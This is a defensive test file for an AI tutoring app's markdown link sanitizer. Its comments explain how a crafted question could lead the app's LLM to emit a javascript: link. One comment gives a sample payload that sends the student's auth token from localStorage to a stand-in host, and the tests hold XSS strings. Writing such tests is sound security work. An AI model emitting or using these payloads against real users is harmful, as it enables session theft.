/* The AI coach's and exam generator's answers are rendered as markdown (react-markdown, App.jsx's RichAnswer). The
   text comes from an LLM, which a crafted question can get to emit a markdown link whose address is "javascript:…"
   or "data:text/html,…" instead of a real address. React puts whatever a link's href says onto the real DOM <a>
   unchanged, and a browser runs a javascript: address on click like any other code already on the page -- including
   reading the signed-in token straight out of localStorage (see api.js). isSafeMarkdownLink (App.jsx) is the one
   place that stops it: this is the one test file that exercises it.
   Run with:  node --test Frontend/markdownLinkSafety.test.js   (no dependencies -- Node's built-in runner) */
import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";

const app = readFileSync(new URL("./App.jsx", import.meta.url), "utf8");

// isSafeMarkdownLink itself has no import to run standalone (it is one function among thousands in App.jsx, which
// has no DOM test harness -- see dailyPlan.test.js and the other App.jsx wiring tests for the same approach), so
// the regex is extracted from the source and exercised directly. This still catches the regex being edited into
// something unsafe, which is the realistic way this protection would quietly break.
const source = app.slice(app.indexOf("const isSafeMarkdownLink"), app.indexOf("\n\nfunction markdownComponents"));
const regexLiteral = source.match(/\/\^.*\/i/)[0];
// eslint-disable-next-line no-new-func -- reconstructing the exact regex the shipped code uses, not evaluating input
const isSafeMarkdownLink = (href) => typeof href === "string" && new Function("href", `return ${regexLiteral}.test(href.trim());`)(href);

test("a javascript: link is never let through as a real href", () => {
  // Breaks if: markdownComponents() goes back to spreading href straight onto <a> (the bug this closes) -- a
  // crafted answer like "[click here](javascript:fetch('https://evil.test?t='+localStorage.authToken))" would then
  // run on click, in the app's own origin, with the student's own auth token.
  assert.equal(isSafeMarkdownLink("javascript:alert(1)"), false);
  assert.equal(isSafeMarkdownLink("JavaScript:alert(1)"), false); // scheme matching must not be case-sensitive
  assert.equal(isSafeMarkdownLink("  javascript:alert(1)"), false); // nor fooled by leading whitespace
  assert.equal(isSafeMarkdownLink("data:text/html,<script>alert(1)</script>"), false);
  assert.equal(isSafeMarkdownLink("vbscript:msgbox(1)"), false);
});

test("an ordinary link still works", () => {
  assert.equal(isSafeMarkdownLink("https://en.wikipedia.org/wiki/Quadratic_formula"), true);
  assert.equal(isSafeMarkdownLink("http://example.com"), true);
  assert.equal(isSafeMarkdownLink("mailto:help@bondus.tech"), true);
  assert.equal(isSafeMarkdownLink("#section"), true);
  assert.equal(isSafeMarkdownLink("/practice"), true); // a real within-site path is kept, not just same-origin by accident
});

test("a protocol-relative link is refused, not treated as same-origin", () => {
  // "//evil.test/phish" -- no scheme, but a browser takes the page's own scheme, so this is a real link to
  // somewhere else entirely, not a within-site path. Breaks if: the "/" case is loosened to match any leading slash.
  assert.equal(isSafeMarkdownLink("//evil.test/phish"), false);
});

test("markdownComponents renders an unsafe link's href as the span's title, not as a clickable <a>", () => {
  // Characterises the actual fix in markdownComponents(): the unsafe branch still shows the link's text (nothing
  // from the answer disappears), it is just never a real, clickable address.
  const fn = app.slice(app.indexOf("function markdownComponents"), app.indexOf("\n    table:"));
  assert.match(fn, /isSafeMarkdownLink\(href\)/);
  assert.match(fn, /<a \{\.\.\.props\} href=\{href\} target="_blank" rel="noreferrer" \/>/);
  assert.match(fn, /<span \{\.\.\.props\} title=\{href\} \/>/);
});
